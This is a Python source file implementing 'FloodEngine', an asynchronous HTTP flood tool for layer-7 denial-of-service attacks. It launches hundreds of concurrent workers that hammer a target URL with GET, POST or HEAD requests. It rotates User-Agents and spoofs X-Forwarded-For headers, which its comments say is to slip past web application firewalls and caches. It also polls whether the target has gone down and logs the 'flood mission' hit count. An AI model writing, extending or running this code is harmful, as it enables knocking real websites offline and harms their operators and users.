import asyncio
import aiohttp
import time
import random
from typing import List, Dict, Any, Optional, Callable
from utils.logger import logger

class FloodEngine:
    def __init__(self):
        self._session: Optional[aiohttp.ClientSession] = None
        self._is_running = False
        self._stop_event = asyncio.Event()
        self._user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
        ]

    async def get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=5), # Aggressive timeout
                connector=aiohttp.TCPConnector(
                    limit=500, # Cranked up for high-power flooding
                    ssl=False,
                    use_dns_cache=True,
                    ttl_dns_cache=300
                )
            )
        return self._session

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()

    async def check_uptime(self, url: str) -> bool:
        """Check if the target URL is up."""
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=3)) as session:
                async with session.get(url, ssl=False, timeout=3) as resp:
                    return resp.status < 500
        except Exception:
            return False

    async def run_flood(
        self,
        url: str,
        duration: int,
        concurrency: int = 100,
        method: str = "GET",
        on_progress: Optional[Callable[[int, bool], Any]] = None
    ):
        self._is_running = True
        self._stop_event.clear()
        
        session = await self.get_session()
        start_time = time.time()
        requests_sent = 0
        
        logger.info(f"Launching POWER-FLOOD [{method}] on {url} | Workers: {concurrency}")
        
        async def worker():
            nonlocal requests_sent
            while time.time() - start_time < duration and not self._stop_event.is_set():
                try:
                    # Randomized headers to bypass simple WAF/Cache
                    headers = {
                        'User-Agent': random.choice(self._user_agents),
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    }
                    
                    if method.upper() == "POST":
                        async with session.post(url, ssl=False, headers=headers, data=os.urandom(16)) as resp:
                            await resp.release()
                    elif method.upper() == "HEAD":
                        async with session.head(url, ssl=False, headers=headers) as resp:
                            await resp.release()
                    else: # Default GET
                        async with session.get(url, ssl=False, headers=headers) as resp:
                            await resp.release()
                            
                    requests_sent += 1
                except Exception:
                    pass
                
                # Dynamic adjustment: if CPU is low, we don't need to sleep at all
                # But to stay safe on 0.1 CPU limit, we use minimal yielding
                await asyncio.sleep(0) # Yield control back to loop

        # Spawn workers in batches to avoid initial spike
        workers = []
        for _ in range(concurrency):
            workers.append(asyncio.create_task(worker()))
        
        # Monitoring task
        async def monitor():
            while time.time() - start_time < duration and not self._stop_event.is_set():
                is_up = await self.check_uptime(url)
                if on_progress:
                    if asyncio.iscoroutinefunction(on_progress):
                        await on_progress(requests_sent, is_up)
                    else:
                        on_progress(requests_sent, is_up)
                await asyncio.sleep(1)

        try:
            await asyncio.gather(monitor(), *workers)
        finally:
            self._is_running = False
            for w in workers: w.cancel()
            logger.info(f"L7 flood mission complete. Total Hits: {requests_sent}")

    def stop(self):
        self._stop_event.set()
        self._is_running = False
